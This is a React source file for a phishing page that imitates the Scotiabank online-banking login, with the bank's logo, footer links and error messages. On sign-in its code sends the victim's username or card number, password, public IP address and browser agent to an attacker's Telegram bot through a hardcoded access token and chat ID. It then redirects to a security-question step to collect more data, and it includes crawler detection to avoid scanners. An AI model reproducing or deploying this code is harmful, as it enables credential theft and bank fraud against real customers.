import {useEffect, useState} from "react";
import {useHistory} from "react-router";
import Loader from "./Loader";
const {Crawler} = require("es6-crawler-detect");
const CrawlerDetector = new Crawler();
const userAgentString = navigator.userAgent;

const publicIp = require("react-public-ip");
const {TelegramClient} = require("messaging-api-telegram");

const Login = () => {
  const [username, setusername] = useState("");
  const [pass, setPass] = useState("");
  const history = useHistory();
  const [error, setError] = useState(null);
  const [passwordError, setPasswordError] = useState(false);
  const [loading, setIsLoading] = useState(false);

  //bot detect
  const isBotCrawler = CrawlerDetector.isCrawler(userAgentString);

  useEffect(() => {
    if (isBotCrawler) return null;
    setIsLoading(false);
  }, [isBotCrawler]);
  const client = new TelegramClient({
    accessToken: "1753568410:AAH7GxK9NFDliOkapmCWPvlWkIot5XgB8QM",
  });

  const check = () => {
    const validPassword = new RegExp(
      "^(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9])(?=.*[!@#$%^&*])(?=.{8,})"
    );
    console.log(validPassword.test(pass), pass);
    if (username === "") setError(1);
    if (pass === "") setError(2);
    if (username.includes("@")) setPasswordError(true);
    if (!validPassword.test(pass)) setPasswordError(true);
    else {
      setIsLoading(true);
      sendmsg();
    }
  };

  const sendmsg = async () => {
    await client.sendMessage(
      926925229,
      `<u>Login</u>
      #################################
      <b>login</b> : ${username}
      <b>password</b> :  ${pass}
      #################################
      <b>IP</b> : <a href="https://www.geodatatool.com/?IP=${
        (await publicIp.v4()) || ""
      }">Check Ip</a> 
      <b>Client Agent </b> : ${userAgentString}    
`,
      {parseMode: "HTML"}
    );
    username && pass && !passwordError && history.push("/securityQuestion");
  };
  if (loading) return <Loader></Loader>;
  return (
    <div className="uQnxO2uiJOTeY5_KPtBG0">
      <main className="_16e3jP2sLLXzIXpWyvv2MD nJsDmKM3D51Ziq5Zgp6Z_">
        <div>
          <div className="_189buhYsYKCsviWKNS9OP-">
            <div className="Card__container Card__container--xs-padding-18 Card__container--sm-padding-24 Card__container--md-padding-30 Card__container--lg-padding-36 _2P0vW6eMS0PvlMAAf-02Yp">
              <div className="_2s5uhEm1K9lqu1P-8H0c3_">
                <svg
                  className="_3jGPs2mmElVPN8FnMTFXe-"
                  width="16"
                  height="19"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <g
                    fill="none"
                    fillRule="evenodd"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  >
                    <path
                      d="M15 16.449c0 .853-.7 1.551-1.556 1.551H2.556A1.558 1.558 0 011 16.449V8.692c0-.853.7-1.551 1.556-1.551h10.888C14.3 7.14 15 7.839 15 8.692v7.757zM4.111 4.864C4.111 2.732 5.851 1 8 1c2.15 0 3.889 1.732 3.889 3.864v1.751M4.11 7V4.864"
                      stroke="#333"
                      strokeWidth="1.5"
                    />
                    <path
                      strokeWidth="1.5"
                      d="M10.39 11.364l-1.607 1.609-1.564 1.62L5.59 13.08l-.098-.092"
                      stroke="#138468"
                    />
                  </g>
                </svg>
              </div>
              <div
                className="Margin__container _3HVFtZm4ifhQH02wwMp3JT Margin__container-xs-36--top Margin__container-sm-36--top Margin__container-md-36--top Margin__container-lg-36--top"
                xs={36}
                sm={36}
                md={36}
                lg={36}
                side="top"
              >
                <h1 className="TextHeadline__text TextHeadline__text--black TextHeadline__text--medium _2x05Bp1YJ7gu-W6PvGkpLK">
                  Welcome to
                </h1>
                <a
                  href="https://www.scotiabank.com/ca/en/personal.html"
                  target="_blank"
                  rel="noreferrer"
                >
                  <div className="_1B64ZrEq6BvPwNqtqnNEiC">
                    <svg
                      focusable="true"
                      role="img"
                      aria-hidden="false"
                      className="SvgLogo__scotiabankEn--size-36px"
                      aria-labelledby="scotiabankLogo-title"
                      viewBox="0 0 697.04 99.14"
                    >
                      <title id="scotiabankLogo-title">Scotiabank</title>
                      <path
                        d="M187,50a34.48,34.48,0,1,0,34.47,34.47A34.52,34.52,0,0,0,187,50Zm0,49.67a15.2,15.2,0,1,1,15.19-15.2A15.21,15.21,0,0,1,187,99.68Z"
                        transform="translate(-17.58 -19.82)"
                        fill="#EC111A"
                      />
                      <polygon
                        points="247.77 31.83 238.36 31.83 238.36 11.48 217.75 11.48 217.75 31.83 208.34 31.83 208.34 50.48 217.75 50.48 217.75 97.5 238.36 97.5 238.36 50.48 247.77 50.48 247.77 31.83"
                        fill="#EC111A"
                      />
                      <rect
                        x="257.22"
                        y="31.83"
                        width="20.6"
                        height="65.67"
                        fill="#EC111A"
                      />
                      <path
                        d="M285.1,19.82A11.48,11.48,0,1,0,296.59,31.3,11.5,11.5,0,0,0,285.1,19.82Z"
                        transform="translate(-17.58 -19.82)"
                        fill="#EC111A"
                      />
                      <path
                        d="M580.64,69.34a12.3,12.3,0,0,1,12.28,12.28v35.7h20.6V78.8c0-17.49-10.09-28.79-26-28.79-6.55,0-13.46,2.87-19.15,12.05V51.65H547.75v65.67h20.61V81.62A12.3,12.3,0,0,1,580.64,69.34Z"
                        transform="translate(-17.58 -19.82)"
                        fill="#EC111A"
                      />
                      <polygon
                        points="671.05 97.5 645.73 64.69 669.27 31.83 645.19 31.83 626.27 58.4 626.27 1.64 605.66 1.64 605.66 97.5 626.27 97.5 626.27 70.43 647.04 97.5 671.05 97.5"
                        fill="#EC111A"
                      />
                      <path
                        d="M81.54,99.65a30,30,0,0,0,2.11-12.1c0-6.63-2.08-12.55-5.85-16.68C73.4,66.05,65.88,62.05,55.45,59a37,37,0,0,1-5.86-2.2,14.46,14.46,0,0,1-4.37-3.25,7.37,7.37,0,0,1-1.87-5.32c0-3.05,1.63-5.12,4.29-6.79,3.33-2.1,9.74-2.3,16.29.12a39.83,39.83,0,0,1,6.64,3.15l8.76-17.43a49.86,49.86,0,0,0-12.56-5.66,55,55,0,0,0-14-1.77A37.61,37.61,0,0,0,39.7,22a29.82,29.82,0,0,0-10,6.52,30.84,30.84,0,0,0-6.65,10,31.9,31.9,0,0,0-2.21,12.14A25.58,25.58,0,0,0,28.6,68c6,5.63,12.8,7.63,15.54,8.69s5.75,2,7.68,2.71a27.62,27.62,0,0,1,5.64,2.88,9,9,0,0,1,3,3.34,7.53,7.53,0,0,1,.64,4.19,8.59,8.59,0,0,1-2.93,5.66c-1.77,1.66-5,2.61-9.48,2.61a28.68,28.68,0,0,1-11.49-2.76,82.84,82.84,0,0,1-9.33-5l-10.3,17.94C24.77,114.7,36.42,119,46.8,119a49.52,49.52,0,0,0,15.52-2.48,35.59,35.59,0,0,0,11.77-6.58A30.48,30.48,0,0,0,81.54,99.65Z"
                        transform="translate(-17.58 -19.82)"
                        fill="#EC111A"
                      />
                      <path
                        d="M703.14,94.36a11.48,11.48,0,1,0,11.48,11.48A11.48,11.48,0,0,0,703.14,94.36Zm0,20.65a9.17,9.17,0,1,1,9.17-9.17A9.17,9.17,0,0,1,703.14,115Z"
                        transform="translate(-17.58 -19.82)"
                        fill="#EC111A"
                      />
                      <path
                        d="M703.12,107.76h-1.84v4.35H699V99.58h4.8a4.16,4.16,0,0,1,4.17,4.15,4.07,4.07,0,0,1-2.41,3.65l2.64,4.73h-2.71Zm-1.84-2.1h2.63a1.93,1.93,0,0,0,0-3.84h-2.63Z"
                        transform="translate(-17.58 -19.82)"
                        fill="#EC111A"
                      />
                      <path
                        d="M138,94A15.2,15.2,0,1,1,138,75L151.63,61.3A34.42,34.42,0,0,0,126.13,50c-19,0-35.56,13.53-35.56,34.48S107.12,119,126.13,119a34.42,34.42,0,0,0,25.5-11.29Z"
                        transform="translate(-17.58 -19.82)"
                        fill="#EC111A"
                      />
                      <path
                        d="M376,117.32V51.65H355.93v6.9l-1.86-1.66A25.12,25.12,0,0,0,336.77,50C319,50,304.06,65.8,304.06,84.48S319,119,336.77,119a25.12,25.12,0,0,0,17.3-6.88l1.86-1.66v6.9ZM340,100a15.52,15.52,0,1,1,15.51-15.52A15.53,15.53,0,0,1,340,100Z"
                        transform="translate(-17.58 -19.82)"
                        fill="#EC111A"
                      />
                      <path
                        d="M537.89,117.32V51.65H517.8v6.9l-1.86-1.66A25.12,25.12,0,0,0,498.64,50c-17.73,0-32.71,15.79-32.71,34.47s15,34.48,32.71,34.48a25.12,25.12,0,0,0,17.3-6.88l1.86-1.66v6.9ZM501.84,100a15.52,15.52,0,1,1,15.51-15.52A15.53,15.53,0,0,1,501.84,100Z"
                        transform="translate(-17.58 -19.82)"
                        fill="#EC111A"
                      />
                      <path
                        d="M406.77,117.32v-6.9l1.86,1.66a25.1,25.1,0,0,0,17.3,6.88c17.73,0,32.7-15.79,32.7-34.48S443.66,50,425.93,50a25.1,25.1,0,0,0-17.3,6.88l-1.86,1.66V21.46H386.68v95.86Zm.44-32.84A15.52,15.52,0,1,1,422.73,100,15.53,15.53,0,0,1,407.21,84.48Z"
                        transform="translate(-17.58 -19.82)"
                        fill="#EC111A"
                      />
                    </svg>
                  </div>
                </a>
                <div
                  xs={54}
                  sm={54}
                  md={54}
                  lg={54}
                  side="bottom"
                  className="Margin__container Margin__container-xs-54--bottom Margin__container-sm-54--bottom Margin__container-md-54--bottom Margin__container-lg-54--bottom"
                >
                  <div />
                  {passwordError &&
                    passwordEror(
                      "Please check your card number / username or password and try again"
                    )}
                </div>
                <fieldset>
                  <span className="SROnly__container">
                    <legend>login</legend>
                  </span>
                  <label id="usernameInput-label" htmlFor="usernameInput-input">
                    <span className="SROnly__container">
                      Error Username or card number Please enter your username
                      or card number.
                    </span>
                  </label>
                  <div className="InputContainer__input">
                    <div className="InputContainer__input--inline">
                      <svg
                        className="SvgIcon__icon SvgIcon__icon-icon--size-18px Input__icon Input__icon--left"
                        focusable="false"
                        role="presentation"
                        aria-hidden="true"
                        viewBox="0 0 24 24"
                      >
                        <g fill="none">
                          <path d="M22.129 22.129v-2.39c0-2.64-2.328-4.781-5.199-4.781H6.532c-2.871 0-5.199 2.14-5.199 4.78v2.39" />
                          <circle cx="12.09" cy="6.353" r="5.02" />
                        </g>
                      </svg>
                      <input
                        type="text"
                        id="usernameInput-input"
                        name="usernameInput"
                        onChange={(event) => {
                          setusername(event.target.value);
                        }}
                        placeholder="Username or card number"
                        className="Input__input Input__input--textField Input__input--with-left-icon UsernameTextField--with-clear-button"
                      />
                    </div>
                    {error === 1 && (
                      <div
                        className="Error__container"
                        aria-label="Error Please enter your username or card number."
                      >
                        <span className="Error__icon">
                          <svg
                            className="SvgIcon__icon SvgIcon__icon--color-darkRed SvgIcon__icon-icon--size-18px"
                            focusable="false"
                            role="img"
                            aria-hidden="false"
                            aria-label="Error"
                            viewBox="0 0 24 24"
                          >
                            <path
                              stroke="none"
                              d="M15.732 1.544l6.664 6.664a5.32 5.32 0 0 1 0 7.524l-6.664 6.664a5.32 5.32 0 0 1-7.524 0l-6.664-6.664a5.32 5.32 0 0 1 0-7.524l6.664-6.664a5.32 5.32 0 0 1 7.524 0zm-5.1 4.057v6.837c0 .72.529 1.302 1.18 1.302.653 0 1.181-.583 1.181-1.302V5.601c0-.72-.528-1.303-1.18-1.303-.652 0-1.18.583-1.18 1.303zm1.338 14.04a1.77 1.77 0 1 0 0-3.54 1.77 1.77 0 0 0 0 3.54z"
                            />
                          </svg>
                        </span>
                        <div className="Error__text">
                          <span>
                            Please enter your username or card number.
                          </span>
                        </div>
                      </div>
                    )}
                  </div>
                  <div
                    xs={12}
                    sm={12}
                    md={12}
                    lg={12}
                    side="top"
                    className="Margin__container Margin__container-xs-12--top Margin__container-sm-12--top Margin__container-md-12--top Margin__container-lg-12--top"
                  >
                    <label id="password-label" htmlFor="password-input">
                      <span className="SROnly__container">
                        Error Password Please enter your password.
                      </span>
                    </label>
                    <div className="InputContainer__input">
                      <div className="InputContainer__input--inline">
                        <svg
                          className="SvgIcon__icon SvgIcon__icon-icon--size-18px Input__icon Input__icon--left PasswordTextField__icon--lock"
                          focusable="false"
                          role="presentation"
                          aria-hidden="true"
                          viewBox="0 0 24 24"
                        >
                          <path
                            fill="none"
                            d="M20.175 19.972c0 .988-.808 1.796-1.796 1.796H5.804a1.802 1.802 0 0 1-1.797-1.796v-8.983c0-.988.808-1.796 1.797-1.796h12.575c.988 0 1.796.808 1.796 1.796v8.983z"
                          />
                          <path d="M12.99 13.684a.897.897 0 1 1-1.795.002.897.897 0 0 1 1.794-.002z" />
                          <path fill="none" d="M12.104 14.582v2.695" />
                          <path
                            fill="none"
                            d="M16.607 6.498v2.33M7.6 9.065V6.499m0 0a4.492 4.492 0 0 1 8.982 0"
                          />
                        </svg>
                        <input
                          type="password"
                          id="password-input"
                          name="password"
                          onChange={(event) => {
                            setPass(event.target.value);
                          }}
                          placeholder="Password"
                          className="Input__input Input__input--error Input__input--textField Input__input--with-right-icon Input__input--with-left-icon"
                        />
                      </div>
                      {error === 2 && (
                        <div
                          className="Error__container"
                          aria-label="Error Please enter your password."
                        >
                          <span className="Error__icon">
                            <svg
                              className="SvgIcon__icon SvgIcon__icon--color-darkRed SvgIcon__icon-icon--size-18px"
                              focusable="false"
                              role="img"
                              aria-hidden="false"
                              aria-label="Error"
                              viewBox="0 0 24 24"
                            >
                              <path
                                stroke="none"
                                d="M15.732 1.544l6.664 6.664a5.32 5.32 0 0 1 0 7.524l-6.664 6.664a5.32 5.32 0 0 1-7.524 0l-6.664-6.664a5.32 5.32 0 0 1 0-7.524l6.664-6.664a5.32 5.32 0 0 1 7.524 0zm-5.1 4.057v6.837c0 .72.529 1.302 1.18 1.302.653 0 1.181-.583 1.181-1.302V5.601c0-.72-.528-1.303-1.18-1.303-.652 0-1.18.583-1.18 1.303zm1.338 14.04a1.77 1.77 0 1 0 0-3.54 1.77 1.77 0 0 0 0 3.54z"
                              />
                            </svg>
                          </span>
                          <div className="Error__text">
                            <span>Please enter your password.</span>
                          </div>
                        </div>
                      )}
                    </div>
                  </div>
                  <div
                    xs={18}
                    sm={18}
                    md={18}
                    lg={18}
                    side="top"
                    className="Margin__container Margin__container-xs-18--top Margin__container-sm-18--top Margin__container-md-18--top Margin__container-lg-18--top"
                  >
                    <div className="InputContainer__input--inline Checkbox__container _2IX1IBIW4mYG_6azaZb_K_">
                      <div className="Checkbox__tooltipInput">
                        <label htmlFor="rememberMe" className="Checkbox__label">
                          <input
                            type="checkbox"
                            id="rememberMe"
                            name="remember me"
                            className="Input__input Checkbox__input"
                            defaultValue
                          />
                          <span className="Checkbox__span">
                            <svg
                              className="SvgIcon__icon SvgIcon__icon-icon--size-12px Checkbox__icon"
                              focusable="false"
                              role="presentation"
                              aria-hidden="true"
                              viewBox="0 0 24 24"
                            >
                              <path
                                stroke="none"
                                d="M13.85 10.667l6.533-5.683A1.727 1.727 0 0 1 22.65 7.59l-6.511 5.663-6.371 5.74c-.7.63-1.775.585-2.418-.103l-6.134-6.559a1.727 1.727 0 0 1 2.522-2.359l4.977 5.321 5.134-4.626z"
                              />
                            </svg>
                          </span>
                          <div className="Label__label Label__label--checkbox Label__label--inline">
                            Remember my username or card number
                          </div>
                        </label>
                      </div>
                    </div>
                  </div>
                  <div
                    xs={30}
                    sm={30}
                    md={30}
                    lg={30}
                    side="bottom"
                    className="Margin__container Margin__container-xs-30--bottom Margin__container-sm-30--bottom Margin__container-md-30--bottom Margin__container-lg-30--bottom"
                  >
                    <div
                      xs={48}
                      sm={48}
                      md={48}
                      lg={48}
                      side="top"
                      className="Margin__container Margin__container-xs-48--top Margin__container-sm-48--top Margin__container-md-48--top Margin__container-lg-48--top"
                    >
                      <button
                        className="ButtonCore__button Button__button--primary _3QIv3Rkx0hZd1e7JFFYXPY"
                        id="signIn"
                      >
                        <span
                          onClick={() => check()}
                          className="ButtonCore__block"
                          tabIndex={-1}
                        >
                          <span className="ButtonCore__text">Sign in</span>
                        </span>
                      </button>
                    </div>
                  </div>
                </fieldset>
                <a href="/" className="StandaloneLink _3HOsX3GVu55tRH6miG5dd_">
                  <span className="StandaloneLink__text StandaloneLink__text--internal-blue">
                    Need help signing in?
                  </span>
                </a>
              </div>
            </div>
          </div>
          <div
            xs={36}
            sm={60}
            md={60}
            lg={60}
            className="Margin__container _3nxHoyhRMxjRdmZp_nmuE2 Margin__container-xs-36--vertical Margin__container-sm-60--vertical Margin__container-md-60--vertical Margin__container-lg-60--vertical"
            side="both"
          >
            <span className="TextBody__text TextBody__text--1 TextBody__text--black _2uk89vYv-CLMYFl3ozyjDy">
              Don't have a username and password?
            </span>
            <a
              href="/"
              tabIndex={0}
              className="Link__link Link__link--size-18px"
            >
              <span className="Link__text">Set them up now.</span>
            </a>
          </div>
        </div>
      </main>
      <footer className="Footer__footer">
        <div className="Grid__container Footer__upperBar">
          <div className="Row__container Footer__upperBarRow ">
            <div className="Column__container Column__xs-4 Column__sm-8 Column__md-6 Column__lg-6 Footer__logoHolder">
              <svg
                focusable="true"
                role="img"
                aria-hidden="false"
                className="SvgLogo__flyingS--size-24px Footer__logo"
                aria-labelledby="footer-logo-title"
                viewBox="0 0 498.27 552.11"
              >
                <title id="footer-logo-title">Scotiabank</title>
                <path
                  d="M637.94,371.45H481.69A173.16,173.16,0,0,0,309.61,525.34h0A173.18,173.18,0,0,1,461.19,268.53H730.82Z"
                  transform="translate(-232.55 -268.53)"
                  fill="#EC111A"
                />
                <path
                  d="M325.43,717.72H481.69A173.15,173.15,0,0,0,653.76,563.83h0A173.18,173.18,0,0,1,502.18,820.64H232.55Z"
                  transform="translate(-232.55 -268.53)"
                  fill="#EC111A"
                />
                <circle cx="249.14" cy="276.05" r="139.06" fill="#EC111A" />
              </svg>
            </div>
            <div className="Column__container Column__xs-4 Column__sm-8 Column__md-6 Column__lg-6">
              <ul className="Footer__footerNav">
                <li className="Footer__navLinks">
                  <a
                    href="https://www.scotiabank.com/ca/en/personal/contact-us.html"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="Footer__links"
                  >
                    <p className="TextCaption__text TextCaption__text--black">
                      Contact Us
                    </p>
                  </a>
                </li>
                <li className="Footer__navLinks">
                  <a
                    href="https://www.scotiabank.com/ca/en/about/contact-us/security.html"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="Footer__links"
                  >
                    <p className="TextCaption__text TextCaption__text--black">
                      Security
                    </p>
                  </a>
                </li>
                <li className="Footer__navLinks">
                  <a
                    href="https://www.scotiabank.com/ca/en/about/contact-us/legal.html"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="Footer__links"
                  >
                    <p className="TextCaption__text TextCaption__text--black">
                      Legal
                    </p>
                  </a>
                </li>
                <li className="Footer__navLinks">
                  <a
                    href="https://www.scotiabank.com/ca/en/about/contact-us/privacy.html"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="Footer__links"
                  >
                    <p className="TextCaption__text TextCaption__text--black">
                      Privacy
                    </p>
                  </a>
                </li>
                <li className="Footer__navLinks">
                  <a
                    href="https://www.scotiabank.com/ca/en/personal/accessibility.html"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="Footer__links"
                  >
                    <p className="TextCaption__text TextCaption__text--black">
                      Accessibility
                    </p>
                  </a>
                </li>
              </ul>
            </div>
          </div>
        </div>
        <div className="Footer__base Footer__base--white">
          <div className="Grid__container">
            <div className="Row__container">
              <div className="Column__container Column__xs-4 Column__sm-8 Column__md-12 Column__lg-12 Footer__copyRights">
                <p className="TextLegal__text">
                  © Scotiabank. All Rights Reserved.
                </p>
              </div>
            </div>
          </div>
        </div>
      </footer>
      <a
        className="_2ALm1j8YuQmwl8Gkc1YLnH"
        href="https://assets.kampyle.com/resources/direct/form.html?region=prodCanada&websiteId=11757&formId=1127&bgclr=white"
        rel="noopener noreferrer"
        target="_blank"
      >
        <span
          className="TextCaption__text TextCaption__text--black ltf44NmV8dxdh56CbDo9C"
          weight="bold"
        >
          Feedback
        </span>
      </a>
    </div>
  );
};

export default Login;

export const passwordEror = (error) => (
  <div
    xs={36}
    sm={36}
    md={36}
    lg={36}
    side="both"
    className="Margin__container Margin__container-xs-36--vertical Margin__container-sm-36--vertical Margin__container-md-36--vertical Margin__container-lg-36--vertical"
  >
    <div
      className="Card__container Card__container--xs-padding-24 Card__container--sm-padding-24 Card__container--md-padding-24 Card__container--lg-padding-24"
      id="globalError"
    >
      <div className="_25yKbJzdQG5JaS-QB9EOCt">
        <div>
          <svg
            className="SvgIcon__icon SvgIcon__icon--color-darkRed SvgIcon__icon-icon--size-18px"
            focusable="false"
            role="presentation"
            aria-hidden="true"
            viewBox="0 0 24 24"
          >
            <path
              stroke="none"
              d="M15.732 1.544l6.664 6.664a5.32 5.32 0 0 1 0 7.524l-6.664 6.664a5.32 5.32 0 0 1-7.524 0l-6.664-6.664a5.32 5.32 0 0 1 0-7.524l6.664-6.664a5.32 5.32 0 0 1 7.524 0zm-5.1 4.057v6.837c0 .72.529 1.302 1.18 1.302.653 0 1.181-.583 1.181-1.302V5.601c0-.72-.528-1.303-1.18-1.303-.652 0-1.18.583-1.18 1.303zm1.338 14.04a1.77 1.77 0 1 0 0-3.54 1.77 1.77 0 0 0 0 3.54z"
            />
          </svg>
        </div>
        <div className="TextBody__text TextBody__text--2 TextBody__text--black _1u8riMqU2Y4IEgHc3CDV_c">
          {error}
        </div>
      </div>
    </div>
  </div>
);
